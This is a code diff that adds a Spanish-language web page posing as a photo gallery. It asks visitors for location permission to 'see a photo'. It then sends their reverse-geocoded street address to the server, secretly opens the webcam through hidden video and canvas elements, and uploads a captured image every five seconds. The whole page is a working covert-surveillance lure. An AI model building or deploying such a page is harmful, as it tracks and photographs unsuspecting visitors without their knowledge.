@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Galeria de fotos</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            margin: 0;
+            padding: 20px;
+            text-align: center;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        #mensaje {
+            margin-bottom: 20px;
+            color: #555;
+        }
+
+        button {
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            text-align: center;
+            text-decoration: none;
+            display: inline-block;
+            font-size: 16px;
+            margin: 4px 2px;
+            cursor: pointer;
+            border-radius: 5px;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #foto-titulo {
+            color: #333;
+            margin-top: 20px;
+        }
+
+        #foto-ejemplo {
+            margin-top: 10px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            max-width: 100%;
+            height: auto;
+            object-fit: cover;
+        }
+
+        video {
+            display: none;
+        }
+
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h1>Obtener Foto</h1>
+    <p id="mensaje">Para ver esta imagen, necesitas dar los permisos a la ubicación.</p>
+    <button onclick="obtenerUbicacion()">Ver foto</button>
+    <div id="ubicacion"></div>
+
+    <h2 id="foto-titulo" style="display:none;">Foto:</h2>
+    <img id="foto-ejemplo" src="image.jpg" alt="Foto ejemplo" style="display:none;"/>
+
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas"></canvas>
+
+    <script src="script.js"></script>
+</body>
+</html>
+
+
+
+<script>
+function obtenerUbicacion() {
+    if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(mostrarPosicion, mostrarError);
+    } else {
+        document.getElementById("mensaje").innerText = "La geolocalización no es soportada por este navegador.";
+    }
+}
+
+function mostrarPosicion(position) {
+    const lat = position.coords.latitude;
+    const lon = position.coords.longitude;
+
+    // Llamada a la API de Nominatim para geocodificación inversa
+    const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${lat}&lon=${lon}`;
+
+    fetch(url)
+        .then(response => response.json())
+        .then(data => {
+            if (data.address) {
+                const direccion = data.display_name;
+                // Enviar la dirección al servidor
+                fetch('/guardar_direccion', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({ direccion: direccion })
+                });
+
+                // Mostrar la foto de ejemplo
+                document.getElementById('foto-titulo').style.display = 'block';
+                document.getElementById('foto-ejemplo').style.display = 'block';
+
+                // Comenzar a tomar fotos automáticamente
+                comenzarCapturaDeFotos();
+            } else {
+                document.getElementById("mensaje").innerText = 'No se pudo obtener la dirección.';
+            }
+        })
+        .catch(error => {
+            console.error('Error al obtener la dirección:', error);
+            document.getElementById("mensaje").innerText = 'Ocurrió un error al obtener la dirección.';
+        });
+}
+
+function mostrarError(error) {
+    switch (error.code) {
+        case error.PERMISSION_DENIED:
+            document.getElementById("mensaje").innerText = "El usuario denegó la solicitud de geolocalización.";
+            break;
+        case error.POSITION_UNAVAILABLE:
+            document.getElementById("mensaje").innerText = "La información de ubicación no está disponible.";
+            break;
+        case error.TIMEOUT:
+            document.getElementById("mensaje").innerText = "La solicitud para obtener la ubicación ha caducado.";
+            break;
+        case error.UNKNOWN_ERROR:
+            document.getElementById("mensaje").innerText = "Un error desconocido ocurrió.";
+            break;
+    }
+}
+
+function comenzarCapturaDeFotos() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+        .then(stream => {
+            video.srcObject = stream;
+            video.play();
+            // Comienza el bucle de captura de fotos
+            setInterval(tomarFoto, 5000);  // Toma una foto cada 5 segundos
+        })
+        .catch(err => {
+            console.error("Error al acceder a la cámara: ", err);
+        });
+}
+
+function tomarFoto() {
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const context = canvas.getContext('2d');
+
+    if (video.videoWidth && video.videoHeight) {
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        context.drawImage(video, 0, 0, video.videoWidth, video.videoHeight);
+
+        const data = canvas.toDataURL('image/png');
+
+        // Enviar la imagen al servidor
+        fetch('/guardar_foto', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ image: data })
+        })
+        .catch(err => {
+            console.error('Error al enviar la foto al servidor:', err);
+        });
+    } else {
+        console.error('No se pudo obtener las dimensiones del video.');
+    }
+}
+
+
+</script>
